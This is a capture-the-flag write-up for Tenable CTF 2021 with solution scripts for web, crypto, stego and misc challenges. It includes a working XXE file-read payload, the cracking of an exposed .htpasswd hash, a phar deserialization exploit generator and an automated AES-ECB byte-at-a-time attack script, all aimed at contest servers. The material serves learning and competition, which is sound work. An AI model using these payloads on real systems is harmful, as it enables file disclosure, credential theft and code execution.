# Tenable CTF 2021

We only list the interesting challenges as some required no knowledge or skill at all.

## Web

### Send A Letter
We got a frontend that sends XML requests to a webserver. The request looks like this after we put some values into the fields:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<letter>
    <from>111</from>
    <return_addr>222</return_addr>
    <name>333</name>
    <addr>444</addr>
    <message>555</message>
</letter>
```
After a successfull request we get the following alert:
```
Data: Message to 333 appended to /tmp/messages_outbound.txt for pickup. Mailbox flag raised.
Status: success
```
The response contains one of the values we initally passed to the form. This means that the XML got probably parsed on the server side. So let's look for XML parser exploits!

At first we tried some php-xmlrpc exploit code which didn't work. After that we discovered what XXE's are. We tried some POC payloads from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) and this one worked:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "file:///tmp/messages_outbound.txt">
]>
<letter>
    <from>111</from>
    <return_addr>222</return_addr>
    <name>&sp;</name>
    <addr>444</addr>
    <message>555</message>
</letter>
```
The response contained the flag
```
flag{xxe_aww_yeah}
```
---
### Protected Directory
The task was to find a flag hidden inside a protected directory on a webserver. We tried some common paths and finally got a `401 Unauthorized` on `/admin`.

We thought about different solutions while trying random things. We remembered that users are stored in a file called `.htpasswd`. However, this file is usually not in an accessible directory. Eh, well turns out it is: `/.htpasswd` as easy as it gets. It's contents:
```
admin:$apr1$1U8G15kK$tr9xPqBn68moYoH4atbg20
```
Well, `admin` should be the username and the dollar signs usually indicate a hash.
```
$algorithm$hash
# or
$algorithm$salt$hash
```
So `apr1` is the hash algorithm being used, `1U8G15kK` the salt and `tr9xPqBn68moYoH4atbg20` is our hash. Knowing the parts doesn't actually matter, we throw the complete hash into john anyway.

We get the following credentials after some seconds:
```
admin:alesh16
```

With the credentials we can access the admin area and retrieve the flag:
```
flag{cracked_the_password}
```
---
### Rabbit Hole
We got the following URL with a query parameter `page` attached:
```
http://167.71.246.232:8080/rabbit_hole.php?page=cE4g5bWZtYCuovEgYSO1
```
It returned the following page:
```
513, 71]
 4O48APmBiNJhZBfTWMzD
```

With some curiosity we figured out that the last value can be used to get a different page. Simply by providing the new value as the query parameter `page`. The next page looks kinda similar. However, the values have changed:
```
803, A5]
 dUfob5k9t2vH1dVEU9bU
```

We wrote a script that follows the trail.
```php
<?php

$url = 'http://167.71.246.232:8080/rabbit_hole.php?page=';
$page = 'cE4g5bWZtYCuovEgYSO1';

$result = array();

$fd = fopen('result.log', 'a');
$fd2 = fopen('result_php_array.log', 'a');
fwrite($fd2, '$result = [' . PHP_EOL);

while (true) {
    $e = array();
    $content = file_get_contents($url . $page);

    $parts = explode(', ', $content);
    $number = substr($parts[0], 1);
    $hex = substr($parts[1], 1, 2);

    $page = explode("]\n ", $content)[1];

    fwrite($fd, $number . ';' . $hex . ';' . $page . PHP_EOL);
    fwrite($fd2, '[' . $number . ',\'' . $hex . '\',\'' . $page . '\'],' . PHP_EOL);

    echo str_replace(PHP_EOL, ' ', $content) . PHP_EOL;
}

```
The trail stopped after 1582 requests with an `End`:
```
1192, 25] wkxPetY8Va7evRDCM19w
471, 5E] cJagk3ibVq5t6eToZcL1
761, 48] 3jsoCJN0jDn7ilbMlp3t
1096, 96] eqvboUVZoSB5Hqs7RSjZ
880, 85] u1JtCXqJ6BjtkOV9smpR
664, A7] GP5A3vrKVn7DI7Jhq2dq
421, C9] PZXyBTUxHOYXqQCskWlE
End
```

Looking at the accumulated data we thought this kinda looks like indexed hex values. The first value is the index, second value is a byte (as hexadecimal) and the last value is a pointer to the next value. We wrote another script to glue the bytes together:
```php
<?php

# We named the array in result_php_array.log "$r"
require_once 'result_php_array.log';

$sorted = array();
foreach ($result as $r) {
    $sorted[$r[0]] = array($r[1], $r[2]);
}

$fd = fopen('somefile', 'w');
for ($i = 0; $i < 1582; $i++) {
    fwrite($fd, hex2bin($sorted[$i][0]));
}

fclose($fd);
```

The result was a PNG file containing the flag:
```
flag{automation_is_handy}
```
---
### Phar Out
We got a link to a PHP application inlcuding the source code. The page states that it will accept any file and calculate the hash of it. This is the source code for accepting a file:
```php
<?php

include("wrapper.php");

if (isset($_POST['submit']) && $_FILES['the_file']['size'] > 0)
{
	$dest_dir = getcwd() . "/uploads/";

	echo "<br />Submitted<br />";
	$target_file = $dest_dir . basename($_FILES["the_file"]["name"]);
	//print_r($_FILES);
	move_uploaded_file($_FILES["the_file"]["tmp_name"], $target_file);

	if ($_POST['s'] === 'p')
		$s = 'phar://';
	else
		$s = 'file://';
	echo md5_file("$s$target_file");
	unlink($target_file);
}
```
There is also some HTML in that file, but that is unimportant right now. We instantly spot that there is a "hidden" query parameter `s` that let's you use `phar://` for the path prefix instead of `file://`. 

The researching begins! We simply look for "phar exploit" or "phar vulnerability". The first results talk about something called a "phar deserialization attack". It is a vulnerability that allows an attacker to create known PHP objects in memory. If the objects implement magic methods like `__wakeup` or `__destruct` then we can execute arbitary code with them. That means if we find any class or object that has these methods defined it's a win.

You can find a very detailed explanation [here](https://pentest-tools.com/blog/exploit-phar-deserialization-vulnerability/). It also has some POC code.

We looked into the remaining source files and found two more interesting files:
- `wrapper.php`: contains an exploitable `__wakeup` call
- `doit.php`: seems to echo the flag if you construct it anyhow
```php
<?php

include("doit.php");

class Wrapper
{
	private $doit;
	public function __wakeup()
	{
		if (isset($this->doit))
		{
			$this->doit = new Doit();
		}
		else
		{
			echo "Hello from Wrapper!";
		}
	}
}
```
```php
<?php

class Doit {
        public function __construct()
        {
                $flag = getenv("FLAG");
                echo "flag{{$flag}}\n";
        }
}
```

We found our exploitable class: `Wrapper`! We also know that our win condition is to construct an object of type `Doit`. This is already being done for us, but only if a property called `doit` is set on the `Wrapper` instance/object that executes `__wakeup`. Now that we know what to do, let's get started!

We use the following code to generate the phar:
```php
<?php

// This will actually not work, you have to set this value manually in your
// active php.ini. Don't forget to change it back!
ini_set('phar.readonly', 0);

// Create a new instance of the Wrapper class and modify its property
class Wrapper { }
$dummy = new Wrapper();
$dummy->doit = "hello";

@unlink("poc.phar");
$poc = new Phar("poc.phar");
$poc->startBuffering();
$poc->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

// Add a new file in the archive with "text" as its content
$poc["file"] = "text";

// Add the dummy object to the metadata. This will be serialized
$poc->setMetadata($dummy);

// Write to disk
$poc->stopBuffering();
```
This will generate a file called `poc.phar` with a custom `Wrapper` object deserialized. Now we simply send this file to the challenge endpoint with query parameter `s` set to `p`, and...
```
flag{scooby}
```
---

## Forensic

### OpenSSL 
This one was pretty cool since we knew absolutley nothing about cryptography. The challenge was to decrypt a message that was encrypted with an unknown key. The algortihm used was AES-128-ECB. They also provided the source code:
```php
<?php

function pad_data($data)
{
  $flag = "flag{wouldnt_y0u_lik3_to_know}"; 

  $pad_len = (16 - (strlen($data.$flag) % 16));
  return $data . $flag . str_repeat(chr($pad_len), $pad_len);
}

if(isset($_POST["do_encrypt"]))
{
  $cipher = "aes-128-ecb";
  $iv  = hex2bin('00000000000000000000000000000000');
  $key = hex2bin('74657374696E676B6579313233343536');
  echo "</br><br><h2>Encrypted Data:</h2>";
  $ciphertext = openssl_encrypt(pad_data($_POST['text_to_encrypt']), $cipher, $key, 0, $iv); 

  echo "<br/>";
  echo "<b>$ciphertext</b>";
}
```
The site provided an input field so you could send some plaintext and it would encrypt it for you. We suspected that the fact that we concat the flag with our input results in some kind of attack possibility. However, we had no clue how to exploit that.

So we started looking for "aes ecb exploit" and found numerous articles about "known plaintext attacks". None of them had any examples for exploitation so we kept searching for some code examples. We found one that fitted our situation really well.

Basically, since every 16 byte block is encrypted seperatley in ecb and identical plaintext results in identical ciphertext, we are able to guess/bruteforce 1 character of the concatenated flag.

The text that has to be encrypted is concatenated like this:
```
input string (3x "_") : ___
flag         (26x "S"): SSSSSSSSSSSSSSSSSSSSSSSSSS

| 16 Byte Block  | 16 Byte Block  | 16 Byte Block  |
+----------------+----------------+----------------+
|___SSSSSSSSSSSSS|SSSSSSSSSSSSSppp|
```
Since AES is a block cipher we need some additional padding `p` in this example (to reach another full 16 byte block).

If we send 15 underscore characters the 16th character will be the first character of the flag.
```
| Block 0        | Block 1        | Block 2        |
+----------------+----------------+----------------+
|________________|SSSSSSSSSSSSSSSS|SSSSSSSSSSSppppp| # 16x "_"
|_______________S|SSSSSSSSSSSSSSSS|SSSSSSSSSSpppppp| # 15x "_" <-
|______________SS|SSSSSSSSSSSSSSSS|SSSSSSSSSppppppp| # 14x "_"
|_____________SSS|SSSSSSSSSSSSSSSS|SSSSSSSSpppppppp| # 15x "_"
...
```
The resulting cipher text for our 15-underscores-payload looks like this:
```
GqYFP9ODJEyBzSYYCRW1Ks8vsRxdptsCat2VaWCzWLWPhtqccShG+8Fdv1A1Wk/zSPxIyejl2ClzlUDyA5FKQQ==
```
Now we start bruteforcing the 16th character by sending 15 underscores and 1 random letter. We compare the results with our 15-underscores-payload result.
```
a => wyFB/1OanJpFraXVt1QtwyYo9PD4+H8psopgTngg21jsnHfX8ePRKY0emV/lULQxSPxIyejl2ClzlUDyA5FKQQ==
b => Omiq383on10J3YQ25DhwLiYo9PD4+H8psopgTngg21jsnHfX8ePRKY0emV/lULQxSPxIyejl2ClzlUDyA5FKQQ==
...
f => 
GqYFP9ODJEyBzSYYCRW1KiYo9PD4+H8psopgTngg21jsnHfX8ePRKY0emV/lULQxSPxIyejl2ClzlUDyA5FKQQ==
```
If you didn't notice already, the beginning of the result for character f seems to be identical to the beginning of the result for our 15-underscores-payload.
```
_______________  results in: GqYFP9ODJEyBzSYYCRW1K...
_______________f results in: GqYFP9ODJEyBzSYYCRW1K...
```
That's because the hidden flag string starts with an `f`.
Now that we bruteforced the first character we can apply the same strategy to the remaining ones. We wrote a script to do that:
```php
function getEncryptedText($text) {
    $context  = stream_context_create(array('http' =>
        array(
            'method'  => 'POST',
            'header'  => 'Content-Type: application/x-www-form-urlencoded',
            'content' => 'text_to_encrypt=' . $text . '&do_encrypt=Encrypt'
        )
    ));
    return explode('</b>', explode('<b>', file_get_contents('http://167.71.246.232:8080/crypto.php', false, $context))[1])[0];
}

$flag = '';
$block32 = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';

// print charset
for ($a = 40; $a < 127; $a++) echo chr($a);
echo PHP_EOL;

// main
for ($i = 0; $i < 32; $i++) {
    $block32 = substr($block32, 0,-1);
    $correct = getEncryptedText($block32);

    // ASCII 40 to 126, letters, digits and some signs
    for ($a = 40; $a < 127; $a++) {
        $test = getEncryptedText($block32 . $flag . chr($a));
        if (substr($test, 0, 24) === substr($correct, 0, 24)) {
            $flag = $flag . chr($a);
            echo chr($a) . PHP_EOL;
            if (chr($a) === '}') die($flag . PHP_EOL);
            break;
        }
        echo '.';
    }
}
```
```
flag{b4d_bl0cks_for_g0nks}
```
---
###  

## Stego

### Numerological
We got a picture of some cistercien shield. This one: https://en.wikipedia.org/wiki/Cistercians

Hidden in there was another png. At a specific address. We extracted it with the following script:
```php
<?php

$content = file_get_contents('shield.png');

$newfile = '';
for ($i = 492445; $i < strlen($content); $i++) {
    $newfile .= $content[$i];
}

file_put_contents('newfile.png', $newfile);
```

The new picture displayed cistercien numerals. You can decode them here: https://www.dcode.fr/cistercian-numbers

```
363736393734326536393666326634613734346136313538
git.io/JtJaX
```

```
flag{th0s3_m0nk5_w3r3_cl3v3r}
```

### A3S Turtles
We received a zip file encrypted with a password. In the zip file is another zip, with another zip file, with another zip file... up
to 128 zip files.

We cracked the first few zip files and figured out that the password is either 1 or 0.

```sh
#!/bin/bash

START=128
ZIP=turtles

FILENAME="$ZIP$START.zip"

for i in {0..127}
do
	a=$START
	START=$((a-1))
	FILENAME="$ZIP$START.zip"
	unzip -P "0" $FILENAME
	if [ "$?" -eq 0 ]; then
		echo "0" >> binary_string.txt
	else
		unzip -P "1" $FILENAME
		echo "1" >> binary_string.txt
	fi

done
```

Concatenate the passwords an you'll get the following string:
```
00111101110010010000011011110110100100101000111011101000100000101100110010110001101110001011110111010001010010101010001001001100
```
...which is an encrypted text.

The last zip contained a `key.png` image with the following transcription:
```
ed570e22d458e25734fc08d849961da9
```
Because of some specific padding you need to decrypt in cyberchef tho.

```
flag{steg0_a3s}
```
## Misc

### Fix Me
We got a corrupted png image. It was basically a large chaotic binary file with random data and some png chunks.

We extracted all the chunks and put the back together using the following script:
```php
<?php


$content = file_get_contents('fixme.png');

function parseChunks($content, $chunkType) {

    $chunks = array();
    $offset = 0;
    while(strpos($content, $chunkType, $offset) !== false) {
        $pos = strpos($content, $chunkType, $offset);

        $length = $content[$pos-4] . $content[$pos-3] . $content[$pos-2] . $content[$pos-1];
        $lengthHex = bin2hex($length);
        $lengthDec = hexdec($lengthHex);

        $data = substr($content, $pos + strlen($chunkType), $lengthDec);
        $crc = substr($content, $pos + strlen($chunkType) + $lengthDec, 4);

        $chunks[] = $length . $chunkType . $data . $crc;
        echo $chunkType . ' Chunk: LEN:' . $lengthDec . ' LENX:' . bin2hex($content[$pos-4] . $content[$pos-3] . $content[$pos-2] . $content[$pos-1]) . PHP_EOL;

        $offset = $pos+1;
    }

    return $chunks;
}

$ihdr_chunks = parseChunks($content, 'IHDR');
$plte_chunks = parseChunks($content, 'PLTE');
$idat_chunks = parseChunks($content, 'IDAT');
$iend_chunks = parseChunks($content, 'IEND');

$png = "\x89PNG\x0D\x0A\x1A\x0A" . implode($ihdr_chunks) . implode($plte_chunks) . implode($idat_chunks) . implode($iend_chunks);

file_put_contents('result.png', $png);
```

```
flag{hands_off_my_png}
```

### Emulator
We got some emulator instructions with some documentation.

```
MOV DRX "LemonS"
XOR TRX DRX
MOV DRX "caviar"
REVERSE DRX
XOR TRX DRX
REVERSE TRX
MOV DRX "vaniLla"
XOR TRX DRX
REVERSE TRX
XOR TRX DRX
REVERSE TRX
MOV DRX "tortillas"
XOR TRX DRX
MOV DRX "applEs"
XOR TRX DRX
MOV DRX "miLK"
REVERSE DRX
XOR TRX DRX
REVERSE TRX
XOR TRX DRX
REVERSE TRX
REVERSE TRX
REVERSE TRX
XOR DRX DRX
XOR TRX DRX
MOV DRX "OaTmeAL"
XOR TRX DRX
REVERSE TRX
REVERSE TRX
REVERSE TRX
XOR DRX DRX
XOR TRX DRX
MOV DRX "cereal"
XOR TRX DRX
MOV DRX "ICE"
REVERSE DRX
XOR TRX DRX
MOV DRX "cHerries"
XOR TRX DRX
REVERSE TRX
XOR TRX DRX
REVERSE TRX
MOV DRX "salmon"
XOR TRX DRX
MOV DRX "chicken"
XOR TRX DRX
MOV DRX "Grapes"
REVERSE DRX
XOR TRX DRX
REVERSE TRX
XOR TRX DRX
REVERSE TRX
MOV DRX "caviar"
REVERSE DRX
XOR TRX DRX
REVERSE TRX
MOV DRX "vaniLla"
XOR TRX DRX
REVERSE TRX
XOR TRX DRX
MOV DRX TRX
MOV TRX "HonEyWheat"
XOR DRX TRX
MOV TRX DRX
MOV DRX "HamBurgerBuns"
REVERSE DRX
XOR TRX DRX
REVERSE TRX
XOR TRX DRX
REVERSE TRX
REVERSE TRX
REVERSE TRX
XOR DRX DRX
XOR TRX DRX
MOV DRX "IceCUBES"
XOR TRX DRX
MOV DRX "BuTTeR"
XOR TRX DRX
REVERSE TRX
XOR TRX DRX
REVERSE TRX
MOV DRX "CaRoTs"
XOR TRX DRX
MOV DRX "strawBerries"
XOR TRX DRX
```

We wrote the emulator for it and received the flag:
```php
<?php

// Register
global $TRX;
global $DRX;

$TRX = '';
$DRX = '';

function opxor_reg($dst, $src) {
    global $DRX, $TRX;

    if (strlen($$dst) > strlen($$src)) {
        $$dst = ($$dst ^ $$src) . substr($$dst, strlen($$src));
    } else {
        $$dst = $$dst ^ $$src;
    }
}

function opxor_val($dst, $val) {
    global $DRX, $TRX;

    if (strlen($$dst) > strlen($val)) {
        $$dst = ($$dst ^ $val) . substr($$dst, strlen($val));
    } else {
        $$dst = $$dst ^ $val;
    }
}

function opmov_reg($dst, $src) {
    global $DRX, $TRX;

    $$dst = $$src;
}

function opmov_val($dst, $val) {
    global $DRX, $TRX;

    $$dst = $val;
}

function opreverse($target) {
    global $DRX, $TRX;

    $$target = strrev($$target);
}

$code = file_get_contents('Crypto.asm');
$lines = explode(PHP_EOL, $code);
$operations = array();

foreach ($lines as $line) {
    $operations[] = explode(' ', trim($line));
}

$TRX = "UL\x03d\x1c'G\x0b'l0kmm_";
$TRX = "GED\x03hG\x15&Ka =;\x0c\x1a31o*5M";

foreach ($operations as $op) {
    switch ($op[0]) {
        case 'MOV':
            if (strpos($op[2], '"') !== false) {
                opmov_val($op[1], str_replace('"', '', $op[2]));
            } else {
                opmov_reg($op[1], $op[2]);
            }
            break;
        case 'XOR':
            if (strpos($op[2], '"') !== false) {
                opxor_val($op[1], str_replace('"', '', $op[2]));
            } else {
                opxor_reg($op[1], $op[2]);
            }
            break;
        case 'REVERSE':
            opreverse($op[1]);
            break;
    }
}

echo 'TRX: ' . bin2hex($TRX) . ' (' . $TRX . ')' . PHP_EOL;
echo 'DRX: ' . bin2hex($DRX) . ' (' . $DRX . ')' . PHP_EOL;
```

```
flag{N1ce_Emul8tor!1}
```

### Cat Tap
Analyzing .pcap files! This time USB captures.

Extract the data from the data or whatever it is called field.

```php
<?php

$mapping = array(
    4 => 'a',
    5 => 'b',
    6 => 'c',
    7 => 'd',
    8 => 'e',
    9 => 'f',
    10 => 'g',
    11 => 'h',
    12 => 'i',
    13 => 'j',
    14 => 'k',
    15 => 'l',
    16 => 'm',
    17 => 'n',
    18 => 'o',
    19 => 'p',
    20 => 'q',
    21 => 'r',
    22 => 's',
    23 => 't',
    24 => 'u',
    25 => 'v',
    26 => 'w',
    27 => 'x',
    28 => 'y',
    29 => 'z',
    30 => '!',
    31 => '@',
    32 => '#',
    33 => '$',
    34 => '%',
    35 => '^',
    36 => '&',
    37 => '*',
    38 => '(',
    39 => ')',
    0x2c => ' ',
    0x2d => '_',
    0x2f => '{',
    0x30 => '}',
    0 => '',
);

$content = file_get_contents('looking_for_hid.csv');

$plain = hex2bin(trim($content));

for ($i = 0; $i < strlen($plain); $i++) {
    if (isset($mapping[ord($plain[$i])])) {
        echo $mapping[ord($plain[$i])];
    } else {
        echo $plain[$i];
    }
}

echo PHP_EOL . PHP_EOL;

// flaagg{usb_pcaps_arree_fun}
```

Which outputs:
```
nootteepaadd7exe(oh hhii77  yoouuu  fiiggurreed it oouut77  ##good jjoob77  i4mm  gonna goo  aheeaaadd and tyyppe aa  ffeeeww tthhiinnnggs ttooo  make tthhhiis pprrreettyy  annooyyiinng ssoo yoouuu  can4t jusstt it ***doo  it manually77  ook77  ##tthhaaatt4s enoouugh77  flaagg{usb_pcaps_arree_fun}cq
```

```
flag{usb_pcaps_are_fun}
```